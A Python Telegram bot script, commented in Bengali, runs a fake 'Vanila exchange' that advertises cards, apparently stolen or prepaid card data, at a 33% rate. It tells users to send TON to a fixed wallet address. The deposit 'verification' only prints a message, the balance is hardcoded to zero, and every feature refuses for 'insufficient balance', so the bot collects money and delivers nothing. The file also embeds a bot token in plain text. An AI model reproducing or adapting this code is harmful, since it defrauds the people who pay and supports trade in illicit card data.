import logging
import datetime
import random
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, CallbackQueryHandler

# --- Flask Server (Keep Alive) ---
app_flask = Flask('')
@app_flask.route('/')
def home(): return "Bot is Alive!"
def run(): app_flask.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- কনফিগারেশন ---
TOKEN = '8586079260:AAEILif880IasDnEyqTHfhzfwCsh1Ff0CxM'

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# ইউজার ইনফো ফাংশন
def get_user_info(update: Update):
    user = update.effective_user
    name = user.first_name if user.first_name else "User"
    username = f"@{user.username}" if user.username else "Not Set"
    uid = user.id
    return name, username, uid

# --- কমান্ড ফাংশনগুলো ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name, _, _ = get_user_info(update)
    text = (f"⚡️Welcome {name} to Vanila exchange ! ⚡️\n"
            "All types of cards are available here at best rates. Current rate is 33%")
    keyboard = [[InlineKeyboardButton("🛒Buy Cards", callback_data='buy_cards'), 
                 InlineKeyboardButton("💳 Stock", callback_data='stock')],
                [InlineKeyboardButton("📞 Contact Admin", url='https://t.me/Vanila_card_prepaid')]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name, username, uid = get_user_info(update)
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    text = (f"✨ **VANILA PROFILE** ✨\n\n"
            f"👤 **Name:** {name}\n"
            f"🆔 **User ID:** `{uid}`\n"
            f"🔹 **Username:** {username}\n"
            f"💰 **TON Balance:** 0.00\n"
            f"📅 **Last updated:** {now}")
    await update.message.reply_text(text, parse_mode='Markdown')

async def deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = ("⚡ **TON DEPOSIT** ⚡\n\nAddress:\n"
            "`UQBZSURuWZwh8BtakAknwG0wsbpzpTGBUDJNhx5Uun4Vhzah`\n\n"
            "Min Deposit: 9 TON")
    keyboard = [[InlineKeyboardButton("Confirm✅", callback_data='confirm_dep'), 
                 InlineKeyboardButton("Cancel⛔", callback_data='cancel_dep')]]
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

# ইনসাফিশিয়েন্ট ব্যালেন্স রিপ্লাই (বাকি সব কমান্ডের জন্য)
async def no_balance_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Due to insufficient balance, you cannot access this feature.")

# --- বাটন ও মেসেজ হ্যান্ডলার ---
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data in ['buy_cards', 'stock']:
        await query.message.reply_text("Insufficient balance. Please deposit first.")
    elif query.data == 'confirm_dep':
        context.user_data['depositing'] = True
        await query.message.reply_text("Please enter the deposit amount (TON):")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('depositing'):
        await update.message.reply_text("✅ Transaction request received. Verifying...")
        context.user_data.clear()

# --- মেইন রানার ---
if __name__ == '__main__':
    keep_alive()
    app = ApplicationBuilder().token(TOKEN).build()
    
    # ১. জরুরি কমান্ডগুলো
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('profile', profile))
    app.add_handler(CommandHandler('deposit', deposit))
    
    # ২. আপনার স্ক্রিনশটের বাকি সব কমান্ড (যা এখন কাজ করবে)
    all_other_commands = [
        'listings', 'unregistered_listing', 'cents_listing', 
        'listing_filter', 'listing_range', 'ref', 'balance', 'withdraw'
    ]
    app.add_handler(CommandHandler(all_other_commands, no_balance_reply))
    
    # ৩. অন্যান্য হ্যান্ডলার
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    
    print("Bot is fully functional...")
    app.run_polling()
    
